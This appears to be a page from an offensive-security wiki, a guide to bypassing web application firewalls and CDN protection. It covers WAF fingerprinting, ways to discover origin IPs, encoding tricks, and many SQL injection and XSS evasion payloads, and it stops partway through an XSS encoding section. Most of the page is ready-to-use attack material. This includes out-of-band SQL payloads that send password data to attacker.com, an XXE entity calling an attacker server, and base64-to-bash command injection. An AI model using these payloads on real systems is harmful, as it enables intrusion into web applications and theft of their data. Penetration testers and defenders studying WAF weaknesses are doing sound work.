

---
title: Proxy & WAF Bypass
description: Complete guide to Web Application Firewall and reverse proxy bypass techniques with payloads, encoding tricks, origin discovery, request smuggling, and real-world evasion methodology.
navigation:
  icon: i-lucide-shield-ban
  title: Proxy & WAF Bypass
---

## What is WAF / Proxy Protection

A Web Application Firewall (WAF) inspects HTTP/HTTPS traffic between clients and web applications, blocking requests that match **malicious signatures, patterns, or behavioral rules**. Reverse proxies, CDNs, and cloud-based WAFs add additional layers of filtering. Bypassing these protections allows payloads to reach the **origin application** unfiltered.

::note
WAF bypass is a **force multiplier** for every other attack. An SQL injection, XSS, RCE, or LFI payload is useless if it gets blocked before reaching the application. Mastering WAF evasion turns theoretical vulnerabilities into **confirmed exploits**.
::

::card-group
  ::card
  ---
  title: Detection & Fingerprinting
  icon: i-lucide-fingerprint
  ---
  Identify which WAF product is deployed, its version, ruleset, and configuration. Knowing the specific WAF dictates which bypass techniques will succeed.
  ::

  ::card
  ---
  title: Encoding & Obfuscation
  icon: i-lucide-binary
  ---
  Transform payloads using **URL encoding, double encoding, Unicode normalization, hex encoding, HTML entities**, and mixed-case to evade pattern matching rules.
  ::

  ::card
  ---
  title: Request Manipulation
  icon: i-lucide-shuffle
  ---
  Change **HTTP methods, Content-Type, chunked encoding, header injection, parameter pollution**, and protocol-level tricks to confuse WAF parsing.
  ::

  ::card
  ---
  title: Origin IP Discovery
  icon: i-lucide-map-pin
  ---
  Find the **real IP** of the origin server behind Cloudflare, Akamai, or AWS CloudFront. Direct connection bypasses all CDN/WAF protections entirely.
  ::

  ::card
  ---
  title: Request Smuggling
  icon: i-lucide-arrow-right-left
  ---
  Exploit parsing differences between **front-end proxy** and **back-end server** to smuggle malicious requests past the WAF undetected.
  ::

  ::card
  ---
  title: Protocol-Level Bypass
  icon: i-lucide-layers
  ---
  Use **HTTP/2 desync, HTTP/0.9, WebSocket upgrade, chunked encoding abuse**, and TLS-layer tricks to bypass inspection at the protocol level.
  ::
::

---

## Methodology & Thinking

::steps{level="3"}

### Fingerprint the WAF

Before any bypass attempt, **identify exactly what you are fighting**. Different WAFs have different weaknesses. A Cloudflare bypass is completely different from a ModSecurity bypass.

```txt [Key Questions]
1. Which WAF product? (Cloudflare, Akamai, AWS WAF, ModSecurity, Imperva, F5, etc.)
2. Which ruleset? (OWASP CRS, custom rules, managed rules?)
3. What mode? (Detection only? Blocking? Learning?)
4. Where is it deployed? (CDN edge? Reverse proxy? Application-level?)
5. What does a blocked response look like? (403? Custom page? CAPTCHA? Drop?)
6. Are there endpoints NOT behind the WAF? (API? Admin? Internal?)
7. Can I reach the origin server directly? (Bypass CDN entirely?)
```

### Understand WAF Parsing vs Application Parsing

WAF bypass fundamentally exploits the **gap between how the WAF parses a request and how the application parses it**. If the WAF sees "safe" content but the application interprets the same bytes as "malicious", the payload passes through.

```txt [The Core Principle]
WAF sees:    "harmless encoded string"  → ALLOW
App decodes: "<script>alert(1)</script>" → EXECUTES

The WAF and the application DISAGREE on what the request contains.
This disagreement IS the bypass.
```

### Test Incrementally

Start with the simplest evasion and escalate. Do not fire complex payloads blindly.

```txt [Escalation Order]
1. Simple encoding (URL encode special chars)
2. Case variation (SeLeCt, ScRiPt)
3. Double encoding (%2527 → %27 → ')
4. Unicode/UTF-8 normalization
5. Comment injection (SEL/**/ECT, <scr<!---->ipt>)
6. Alternate syntax (CHAR(), CONCAT(), String.fromCharCode)
7. Content-Type switching
8. Chunked transfer encoding
9. Parameter pollution
10. Request smuggling
11. Origin IP discovery (bypass entirely)
```

### Confirm the Bypass

After finding a bypass, confirm the payload actually **executes on the application**, not just passes the WAF. A payload that passes the WAF but doesn't trigger the vulnerability is useless.

::

---

## WAF Detection & Fingerprinting

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="wafw00f"}
  ```bash [Terminal]
  # wafw00f - WAF fingerprinting tool (pre-installed on Kali)
  
  # Basic detection
  wafw00f https://target.com
  
  # Verbose output
  wafw00f https://target.com -v
  
  # Test all WAFs (not just first match)
  wafw00f https://target.com -a
  
  # List all detectable WAFs
  wafw00f -l
  
  # Multiple targets from file
  wafw00f -i targets.txt
  
  # Output to file
  wafw00f https://target.com -o waf_results.json -f json
  
  # Installation
  pip3 install wafw00f
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Manual Detection"}
  ```bash [Terminal]
  # Trigger WAF with known malicious payloads
  # and observe the response
  
  # XSS test
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/?q=<script>alert(1)</script>"
  
  # SQLi test
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/?id=1'%20OR%201=1--"
  
  # Path traversal test
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/?file=../../../../etc/passwd"
  
  # Command injection test
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/?cmd=;cat%20/etc/passwd"
  
  # Check response headers for WAF signatures
  curl -s -I "https://target.com/" | grep -iE \
    "(server|x-powered|x-cdn|x-cache|cf-ray|x-sucuri|x-akamai|x-fw|x-waf|x-protected)"
  
  # Check cookies
  curl -s -I "https://target.com/" | grep -i "set-cookie"
  # Look for: __cfduid, __cf_bm, incap_ses_, visid_incap_
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nmap WAF Detection"}
  ```bash [Terminal]
  # Nmap http-waf-detect script
  nmap -p 80,443 --script http-waf-detect target.com
  
  # Nmap http-waf-fingerprint
  nmap -p 80,443 --script http-waf-fingerprint target.com
  
  # Combined with service detection
  nmap -sV -p 80,443 --script http-waf-detect,http-waf-fingerprint target.com
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="nuclei"}
  ```bash [Terminal]
  # nuclei WAF detection templates
  echo "https://target.com" | nuclei -t ~/nuclei-templates/http/technologies/ -tags waf
  
  # Specific WAF detection
  echo "https://target.com" | nuclei -t ~/nuclei-templates/http/technologies/waf-detect.yaml
  
  # Technology stack detection
  echo "https://target.com" | nuclei -tags tech
  ```
  :::
::

### WAF Fingerprint Signatures

| WAF | Detection Signatures |
| --- | -------------------- |
| **Cloudflare** | `cf-ray` header, `__cfduid` / `__cf_bm` cookies, `Server: cloudflare`, error page mentions Cloudflare |
| **AWS WAF** | `x-amzn-requestid` header, `403` with `awselb` cookie, AWS error HTML |
| **Akamai** | `X-Akamai-*` headers, `AkamaiGHost` server, `akamai-origin-hop` |
| **Imperva/Incapsula** | `X-CDN: Imperva`, `incap_ses_*` / `visid_incap_*` cookies, `/_Incapsula_Resource` |
| **ModSecurity** | `Server: Apache` with `Mod_Security`, `406 Not Acceptable`, error ID in body |
| **F5 BIG-IP ASM** | `X-WA-Info` header, `TS` cookie prefix, F5 error pages, `BIGipServer` cookie |
| **Sucuri** | `X-Sucuri-*` headers, `Server: Sucuri/Cloudproxy`, Sucuri error pages |
| **Barracuda** | `barra_counter_session` cookie, `Server: Barracuda`, Barracuda error pages |
| **Fortinet/FortiWeb** | `FORTIWAFSID` cookie, `Server: FortiWeb`, FortiWeb block pages |
| **Azure WAF** | `x-azure-ref` header, `x-ms-*` headers, Azure Front Door signatures |
| **Fastly** | `X-Served-By: cache-*`, `Via: 1.1 varnish`, Fastly error pages |
| **Wordfence** | WordPress-specific, `wfvt_*` cookie, Wordfence block page |

---

## Origin IP Discovery

The most powerful WAF bypass: **find the real IP of the origin server** and connect directly, completely skipping all CDN/WAF protections.

::caution
Direct origin access bypasses **all WAF rules, rate limiting, DDoS protection, and bot detection**. This is equivalent to having no WAF at all.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="DNS History"}
  ```bash [Terminal]
  # Check historical DNS records for pre-WAF IP addresses
  
  # SecurityTrails (API)
  curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
    -H "APIKEY: YOUR_KEY" | jq '.records[].values[].ip'
  
  # ViewDNS.info
  # https://viewdns.info/iphistory/?domain=target.com
  
  # DNSHistory
  # https://dnshistory.org/dns-records/target.com
  
  # CompleteDNS
  # https://completedns.com/dns-history/
  
  # WaybackMachine DNS
  # Check old snapshots of the site for IP leaks in:
  # - JavaScript files
  # - AJAX endpoints
  # - API calls
  # - Error pages
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Certificate Transparency"}
  ```bash [Terminal]
  # SSL certificates may reveal origin IP
  # Certificates are issued to specific IPs/domains
  
  # Search Censys for certificates with target's domain
  censys search "parsed.names: target.com" --index-type certificates | \
    jq -r '.[] | .parsed.names[]'
  
  # Censys search for IP hosting same cert
  censys search "services.tls.certificates.leaf.names: target.com" | \
    jq -r '.[] | .ip'
  
  # Shodan SSL search
  shodan search "ssl.cert.subject.cn:target.com" --fields ip_str
  shodan search 'ssl:"target.com"' --fields ip_str,hostnames
  
  # crt.sh + Shodan correlation
  # Find unique cert serial → search Shodan for that serial
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Email Headers"}
  ```txt [Technique]
  # Trigger the application to send you an email
  # Email headers often reveal the origin server IP

  1. Register an account (confirmation email)
  2. Use "Forgot Password" feature
  3. Trigger any notification email
  4. Examine email headers:

  Received: from mail.target.com (ORIGIN_IP)
  X-Originating-IP: [ORIGIN_IP]
  Received-SPF: pass (origin: ORIGIN_IP)
  Return-Path: <noreply@target.com>
  
  # Check SPF record for allowed IPs:
  dig TXT target.com | grep "v=spf1"
  # v=spf1 ip4:ORIGIN_IP ip4:ORIGIN_RANGE/24 ...
  
  # Check MX records:
  dig MX target.com +short
  # If MX points to same server as web, that's the origin IP
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Subdomain Scanning"}
  ```bash [Terminal]
  # Subdomains often resolve to origin IP (not behind WAF)
  
  # Find subdomains
  subfinder -d target.com -all -silent | \
    dnsx -silent -a -resp | \
    grep -v "CLOUDFLARE_IP_RANGE" > potential_origins.txt
  
  # Common subdomains pointing to origin:
  # mail.target.com
  # ftp.target.com
  # cpanel.target.com
  # webmail.target.com
  # direct.target.com
  # origin.target.com
  # dev.target.com
  # staging.target.com
  # old.target.com
  # internal.target.com
  
  # Compare SSL certs
  # If subdomain has same SSL cert as main domain
  # → likely same server = origin IP
  
  for sub in $(cat subdomains.txt); do
    IP=$(dig +short A "$sub" | head -1)
    echo "$sub → $IP"
    
    # Check if IP is NOT in CDN range
    # Cloudflare ranges: https://www.cloudflare.com/ips/
    # If not Cloudflare → potential origin
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Automated Tools"}
  ```bash [Terminal]
  # CloudFlair - Find origin IPs behind Cloudflare
  python3 cloudflair.py target.com
  
  # CrimeFlare database
  # http://www.crimeflare.org:82/cfs.html
  
  # Bypass-firewalls-by-DNS-history
  git clone https://github.com/vincentcox/bypass-firewalls-by-DNS-history.git
  cd bypass-firewalls-by-DNS-history
  bash bypass-firewalls-by-DNS-history.sh target.com
  
  # CloudUnflare
  git clone https://github.com/greycatz/CloudUnflare.git
  python3 cloudunflare.py -d target.com
  
  # Censys-based origin finder
  python3 cf-check.py target.com
  
  # Check if origin accepts direct connection
  curl -s -H "Host: target.com" "http://ORIGIN_IP/" -o /dev/null -w "%{http_code}"
  
  # Verify it's the same site
  curl -s -H "Host: target.com" "https://ORIGIN_IP/" -k | head -50
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="SSRF / Info Leak"}
  ```txt [Techniques]
  # Use application features to leak origin IP

  # 1. SSRF to localhost/metadata:
  #    If app has URL fetch/preview feature:
  #    Submit: http://169.254.169.254/latest/meta-data/
  #    → AWS metadata reveals private/public IP

  # 2. XML External Entity (XXE):
  #    <!ENTITY xxe SYSTEM "http://ATTACKER_SERVER/">
  #    → Origin server connects to attacker, revealing IP

  # 3. Error pages:
  #    Trigger application errors
  #    Stack traces may reveal internal IP
  #    Debug pages may show server configuration

  # 4. Favicon hash:
  #    Calculate favicon hash → Search Shodan
  python3 -c "
  import mmh3, requests, codecs
  resp = requests.get('https://target.com/favicon.ico')
  favicon = codecs.encode(resp.content, 'base64')
  hash = mmh3.hash(favicon)
  print(f'Shodan query: http.favicon.hash:{hash}')
  "
  # Search that hash on Shodan → find origin IP

  # 5. Unique response headers/body:
  #    Find unique string in response
  #    Search Shodan/Censys for that string
  shodan search 'http.html:"UNIQUE_STRING_FROM_TARGET"'
  ```
  :::
::

### Direct Origin Connection

```bash [Terminal]
# Once you have the origin IP, connect directly:

# Method 1: Host header
curl -s "https://ORIGIN_IP/path" \
  -H "Host: target.com" \
  -k \
  --resolve "target.com:443:ORIGIN_IP"

# Method 2: /etc/hosts (persistent)
echo "ORIGIN_IP target.com" | sudo tee -a /etc/hosts
# Now all requests to target.com go directly to origin

# Method 3: Burp Suite
# Project Options → Connections → Hostname Resolution Overrides
# Add: target.com → ORIGIN_IP

# Method 4: curl --resolve
curl -s "https://target.com/api/endpoint" \
  --resolve "target.com:443:ORIGIN_IP" \
  -k

# Verify you're hitting origin (not CDN):
curl -s -I "https://target.com/" \
  --resolve "target.com:443:ORIGIN_IP" -k | \
  grep -iE "(server|cf-ray|x-cache|x-cdn)"
# No CDN headers = direct to origin
```

---

## Encoding & Obfuscation

Transform payloads so the WAF's pattern matching **fails to recognize** them, while the application's decoder **reconstructs the original payload**.

### URL Encoding

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Single URL Encoding"}
  ```txt [Payloads]
  # Standard URL encoding of special characters
  # WAF blocks: <script>alert(1)</script>
  # Encoded:
  
  %3Cscript%3Ealert(1)%3C/script%3E
  %3Cscript%3Ealert%281%29%3C%2Fscript%3E
  %3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
  
  # SQL injection encoding:
  # WAF blocks: ' OR 1=1--
  %27%20OR%201%3D1--
  %27%20OR%20%271%27%3D%271
  %27%20UNION%20SELECT%201,2,3--
  
  # Command injection encoding:
  # WAF blocks: ;cat /etc/passwd
  %3Bcat%20%2Fetc%2Fpasswd
  %3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
  
  # Key characters:
  # '  = %27
  # "  = %22
  # <  = %3C or %3c
  # >  = %3E or %3e
  # /  = %2F or %2f
  # \  = %5C or %5c
  # (  = %28
  # )  = %29
  # ;  = %3B or %3b
  # |  = %7C or %7c
  # &  = %26
  # =  = %3D
  # space = %20 or +
  # #  = %23
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Double URL Encoding"}
  ```txt [Payloads]
  # Encode the percent sign itself
  # WAF decodes once: %2527 → %27 (looks safe)
  # App decodes again: %27 → ' (malicious!)
  
  # Single quote: ' → %27 → %2527
  # Double quote: " → %22 → %2522
  # Less than:    < → %3C → %253C
  # Greater than: > → %3E → %253E
  # Slash:        / → %2F → %252F
  # Backslash:    \ → %5C → %255C
  # Space:        _ → %20 → %2520
  # Semicolon:    ; → %3B → %253B
  
  # SQLi double encoded:
  %2527%2520OR%25201%253D1--
  %2527%2520UNION%2520SELECT%25201,2,3--
  
  # XSS double encoded:
  %253Cscript%253Ealert(1)%253C%252Fscript%253E
  
  # LFI double encoded:
  %252e%252e%252f%252e%252e%252fetc%252fpasswd
  ..%252f..%252f..%252fetc%252fpasswd
  
  # Triple encoding (rare but works on some systems):
  # ' → %27 → %2527 → %252527
  %252527%252520OR%2525201%25253D1--
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Unicode / UTF-8 Encoding"}
  ```txt [Payloads]
  # Unicode escape sequences
  # WAF may not normalize Unicode before matching
  
  # XSS Unicode payloads:
  \u003Cscript\u003Ealert(1)\u003C/script\u003E
  \x3Cscript\x3Ealert(1)\x3C/script\x3E
  ＜script＞alert(1)＜/script＞      (fullwidth characters)
  <ſcript>alert(1)</ſcript>           (long s → normalizes to s)
  <scrİpt>alert(1)</scrİpt>           (Turkish İ)
  
  # SQL Unicode:
  ＇ OR 1=1--                         (fullwidth apostrophe)
  ' OR 1＝1--                         (fullwidth equals)
  ＇ ＵＮＩＯＮ ＳＥＬＥＣＴ 1,2,3--  (all fullwidth)
  
  # Unicode normalization attacks:
  # NFC, NFD, NFKC, NFKD forms
  # Some chars normalize to dangerous characters:
  # ﬁ → fi     (fi ligature)
  # ﬀ → ff     (ff ligature)
  # ℮ → e
  # ™ → TM
  # ＜ → <     (fullwidth less-than)
  # ＞ → >     (fullwidth greater-than)
  # ＇ → '     (fullwidth apostrophe)
  # ＂ → "     (fullwidth quotation)
  # ／ → /     (fullwidth solidus)
  
  # Overlong UTF-8 encoding (illegal but sometimes processed):
  # / = 0x2F → C0 AF (2-byte overlong)
  # . = 0x2E → C0 AE (2-byte overlong)
  # Used in path traversal:
  %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
  ..%c0%af..%c0%afetc%c0%afpasswd
  
  # %u encoding (IIS specific):
  %u003Cscript%u003Ealert(1)%u003C/script%u003E
  %u0027%u0020OR%u00201=1--
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="HTML Entity Encoding"}
  ```txt [Payloads]
  # HTML entities in XSS context
  
  # Named entities:
  &lt;script&gt;alert(1)&lt;/script&gt;
  &apos; OR 1=1--
  &quot; OR 1=1--
  
  # Decimal entities:
  &#60;script&#62;alert(1)&#60;/script&#62;
  &#39; OR 1=1--
  &#34; OR 1=1--
  
  # Hex entities:
  &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
  &#x27; OR 1=1--
  &#x22; OR 1=1--
  
  # Padded hex (leading zeros):
  &#x0003C;script&#x0003E;alert(1)&#x0003C;/script&#x0003E;
  &#x00027; OR 1=1--
  
  # Mixed encoding:
  &#60;scr&#x69;pt&#62;alert(1)&#60;/scr&#x69;pt&#62;
  <scr&#x69;pt>alert(1)</scr&#x69;pt>
  <scr&#105;pt>alert(1)</scr&#105;pt>
  
  # Without semicolons (still valid HTML):
  &#60script&#62alert(1)&#60/script&#62
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Hex / Octal / Binary"}
  ```txt [Payloads]
  # Hex encoding (used in various contexts):
  
  # SQL hex encoding:
  SELECT 0x3C7363726970743E (= <script>)
  SELECT CHAR(0x27)          (= ')
  SELECT X'27'               (= ')
  
  # MySQL hex strings:
  ' UNION SELECT 0x61646d696e, 0x70617373776f7264--
  # 0x61646d696e = "admin"
  # 0x70617373776f7264 = "password"
  
  # Octal encoding (command injection):
  $'\154\163'                 (= ls)
  $'\143\141\164\40\57\145\164\143\57\160\141\163\163\167\144'  (= cat /etc/passwd)
  
  # Bash hex:
  $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'  (= cat /etc/passwd)
  
  # Base64 encoding:
  echo "cat /etc/passwd" | base64
  # Y2F0IC9ldGMvcGFzc3dk
  echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
  
  # Used as payload:
  ;echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash
  ```
  :::
::

---

## SQL Injection WAF Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Comment Injection"}
  ```txt [Payloads]
  # Inline comments break up keywords
  # WAF pattern: UNION SELECT
  # Bypass: UN/**/ION SE/**/LECT
  
  # MySQL inline comments:
  UN/**/ION/**/SE/**/LECT/**/1,2,3
  UNI/**/ON/**/SEL/**/ECT/**/1,2,3--
  /*!UNION*//*!SELECT*/1,2,3
  /*!50000UNION*//*!50000SELECT*/1,2,3
  
  # Versioned comments (MySQL specific):
  /*!12345UNION*//*!12345SELECT*/1,2,3--
  /*!50000UniOn*//*!50000SeLeCt*/1,2,3--
  
  # Nested comments:
  UN/*xxx*/ION/*xxx*/SE/*xxx*/LECT 1,2,3
  1'/**/UNION/**/ALL/**/SELECT/**/1,2,3--
  
  # Comments with newlines:
  UNION%0A%0DSELECT%0A1,2,3
  UNION%0BSELECT%0B1,2,3
  UNION%0CSELECT%0C1,2,3
  
  # Hash comment (MySQL):
  ' UNION SELECT 1,2,3#
  ' UNION SELECT 1,2,3-- -
  
  # Various comment styles:
  /* comment */
  -- comment
  # comment
  ;%00 (null byte comment)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Case & Whitespace"}
  ```txt [Payloads]
  # Mixed case:
  ' uNiOn SeLeCt 1,2,3--
  ' UnIoN sElEcT 1,2,3--
  ' UNION SELECT 1,2,3--
  ' union select 1,2,3--
  
  # Alternative whitespace characters:
  # Tab (%09), Newline (%0A), Carriage return (%0D)
  # Vertical tab (%0B), Form feed (%0C)
  
  '%09UNION%09SELECT%091,2,3--
  '%0AUNION%0ASELECT%0A1,2,3--
  '%0DUNION%0DSELECT%0D1,2,3--
  '%0BUNION%0BSELECT%0B1,2,3--
  '%0CUNION%0CSELECT%0C1,2,3--
  '%A0UNION%A0SELECT%A01,2,3--
  
  # Multiple spaces:
  '  UNION   SELECT    1,2,3--
  
  # Parentheses instead of spaces:
  'UNION(SELECT(1),(2),(3))--
  '(UNION)(SELECT)(1,2,3)--
  'UNION(SELECT(1),2,3)--
  
  # Plus sign instead of space:
  '+UNION+SELECT+1,2,3--
  
  # Backtick (MySQL):
  `UNION` `SELECT` 1,2,3--
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="String Functions"}
  ```txt [Payloads]
  # Use database functions to construct strings
  # WAF can't match "admin" if it's built dynamically
  
  # MySQL:
  ' UNION SELECT CHAR(97,100,109,105,110)--             # = "admin"
  ' UNION SELECT CONCAT(CHAR(97),CHAR(100),CHAR(109))-- # = "adm"
  ' UNION SELECT 0x61646d696e--                          # = "admin" (hex)
  ' UNION SELECT UNHEX('61646d696e')--                   # = "admin"
  ' UNION SELECT CONVERT(0x61646d696e USING utf8)--
  ' UNION SELECT x'61646d696e'--
  
  # String concatenation:
  ' UNION SELECT CONCAT('ad','min')--
  ' UNION SELECT 'ad' 'min'--                  # MySQL implicit concat
  ' UNION SELECT CONCAT_WS('','ad','min')--
  
  # PostgreSQL:
  ' UNION SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)--
  ' UNION SELECT 'ad'||'min'--
  
  # MSSQL:
  ' UNION SELECT CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)--
  ' UNION SELECT 'ad'+'min'--
  
  # Oracle:
  ' UNION SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110) FROM dual--
  ' UNION SELECT 'ad'||'min' FROM dual--
  
  # SQLite:
  ' UNION SELECT CHAR(97,100,109,105,110)--
  ' UNION SELECT X'61646d696e'--
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Alternative Keywords"}
  ```txt [Payloads]
  # Replace blocked keywords with alternatives
  
  # Instead of UNION SELECT:
  ' UNION ALL SELECT 1,2,3--
  ' UNION DISTINCT SELECT 1,2,3--
  ' UNION SELECT DISTINCT 1,2,3--
  
  # Instead of OR:
  ' || 1=1--
  ' HAVING 1=1--
  ' RLIKE 1--
  ' REGEXP 1--
  
  # Instead of AND:
  ' && 1=1--
  ' %26%26 1=1--
  
  # Instead of =:
  ' OR 1 LIKE 1--
  ' OR 1 BETWEEN 0 AND 2--
  ' OR 1 IN (1)--
  ' OR 1 REGEXP 1--
  
  # Instead of ' (single quote):
  \'
  ''
  %27
  %2527
  ＇ (fullwidth)
  
  # Instead of spaces:
  '/**/OR/**/1=1--
  '+OR+1=1--
  '%09OR%091=1--
  
  # Instead of information_schema:
  `information_schema`
  information_schema/**/ 
  /*!information_schema*/
  
  # Time-based blind (alternative to SLEEP):
  ' OR BENCHMARK(10000000,SHA1('test'))--
  ' OR (SELECT * FROM (SELECT(SLEEP(5)))x)--
  ' OR IF(1=1,SLEEP(5),0)--
  ' WAITFOR DELAY '0:0:5'--   (MSSQL)
  ' OR pg_sleep(5)--           (PostgreSQL)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Stacked Queries & Out-of-Band"}
  ```txt [Payloads]
  # Stacked queries (when semicolons are filtered):
  ' ; SELECT 1--
  '%3B SELECT 1--
  '%3b+SELECT+1--
  
  # Out-of-band data exfiltration:
  # MySQL:
  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',
    (SELECT password FROM users LIMIT 1),
    '.attacker.com\\share'))--
  
  # MSSQL:
  '; EXEC master..xp_dirtree '\\attacker.com\share'--
  '; DECLARE @q VARCHAR(1024);SET @q='\\'+
    (SELECT TOP 1 password FROM users)+
    '.attacker.com\s';EXEC master..xp_dirtree @q--
  
  # PostgreSQL:
  '; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/'||
    (SELECT password FROM users LIMIT 1)--
  
  # Oracle:
  ' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||
    (SELECT password FROM users WHERE ROWNUM=1)) FROM dual--
  ```
  :::
::

### SQLMap Tamper Scripts

::code-collapse
```bash [Terminal]
# SQLMap with WAF bypass tamper scripts

# Single tamper script:
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment

# Multiple tamper scripts chained:
sqlmap -u "https://target.com/page?id=1" \
  --tamper=space2comment,between,randomcase,charunicodeencode

# Common tamper scripts for different WAFs:

# --- Cloudflare ---
sqlmap -u "URL" --tamper=space2comment,between,randomcase -v 3

# --- ModSecurity ---
sqlmap -u "URL" --tamper=modsecurityversioned,modsecurityzeroversioned,space2mysqlblank

# --- AWS WAF ---
sqlmap -u "URL" --tamper=space2comment,charencode,randomcase

# --- Imperva/Incapsula ---
sqlmap -u "URL" --tamper=space2comment,randomcase,between

# --- Generic evasion ---
sqlmap -u "URL" \
  --tamper=apostrophemask,apostrophenullencode,base64encode,between,\
  chardoubleencode,charencode,charunicodeencode,equaltolike,\
  greatest,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,\
  multiplespaces,percentage,randomcase,space2comment,space2dash,\
  space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,\
  unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords

# List all available tamper scripts:
sqlmap --list-tampers

# Additional flags for WAF evasion:
sqlmap -u "URL" \
  --tamper=space2comment,randomcase \
  --random-agent \
  --delay=2 \
  --safe-url="https://target.com/" \
  --safe-freq=3 \
  --skip-waf \
  --level=5 \
  --risk=3 \
  -v 3

# With specific HTTP headers:
sqlmap -u "URL" \
  --tamper=space2comment \
  --headers="X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1" \
  --random-agent

# Available tamper scripts reference:
# apostrophemask          - Replaces ' with %EF%BC%87 (fullwidth)
# apostrophenullencode    - Replaces ' with %00%27
# base64encode            - Base64 encodes entire payload
# between                 - Replaces > with NOT BETWEEN 0 AND
# chardoubleencode        - Double URL encodes
# charencode              - URL encodes all chars
# charunicodeencode       - Unicode URL encodes
# commalesslimit          - Replaces LIMIT M,N with LIMIT N OFFSET M
# equaltolike             - Replaces = with LIKE
# greatest                - Replaces > with GREATEST
# halfversionedmorekeywords - Adds versioned comment before keywords
# modsecurityversioned    - Uses MySQL versioned comments
# modsecurityzeroversioned - Uses zero-versioned comments
# multiplespaces          - Adds multiple spaces around keywords
# percentage              - Adds % before each char
# randomcase              - Random case for keywords
# space2comment           - Replaces spaces with /**/
# space2dash              - Replaces spaces with -- followed by newline
# space2hash              - Replaces spaces with # followed by newline
# space2mssqlblank        - Replaces spaces with MSSQL whitespace chars
# space2mysqlblank        - Replaces spaces with MySQL whitespace chars
# space2mysqldash         - Replaces spaces with -- followed by newline
# space2plus              - Replaces spaces with +
# space2randomblank       - Replaces spaces with random whitespace chars
# unionalltounion         - Replaces UNION ALL with UNION
# unmagicquotes           - Replaces ' with multi-byte %BF%27
# versionedkeywords       - Wraps keywords in versioned comments
# versionedmorekeywords   - Wraps more keywords in versioned comments
```
::

---

## XSS WAF Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Tag & Event Bypass"}
  ```txt [Payloads]
  # When <script> is blocked:
  
  # Alternative tags:
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  <svg/onload=alert(1)>
  <body onload=alert(1)>
  <input onfocus=alert(1) autofocus>
  <marquee onstart=alert(1)>
  <video src=x onerror=alert(1)>
  <audio src=x onerror=alert(1)>
  <details open ontoggle=alert(1)>
  <object data="javascript:alert(1)">
  <embed src="javascript:alert(1)">
  <iframe src="javascript:alert(1)">
  <math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>">
  
  # Event handler variations:
  <img src=x oNeRrOr=alert(1)>
  <svg OnLoAd=alert(1)>
  <body ONLOAD=alert(1)>
  
  # Without parentheses:
  <img src=x onerror=alert`1`>
  <svg onload=alert&lpar;1&rpar;>
  <img src=x onerror="alert`1`">
  
  # Without alert:
  <img src=x onerror=confirm(1)>
  <img src=x onerror=prompt(1)>
  <img src=x onerror=print()>
  <img src=x onerror=top['al'+'ert'](1)>
  <img src=x onerror=window['alert'](1)>
  <img src=x onerror=self['alert'](1)>
  <img src=x onerror=this['alert'](1)>
  
  # Without = sign:
  <script>alert(1)</script>
  <svg><script>alert&#x28;1&#x29;</script></svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Encoding Bypass"}
  ```txt [Payloads]
  # HTML entity encoding:
  <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
  <img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
  
  # JavaScript Unicode:
  <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
  <script>\u0061lert(1)</script>
  
  # JavaScript hex:
  <script>\x61\x6C\x65\x72\x74(1)</script>
  
  # JavaScript octal:
  <script>\141\154\145\162\164(1)</script>
  
  # String.fromCharCode:
  <img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
  
  # atob (base64 decode):
  <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
  
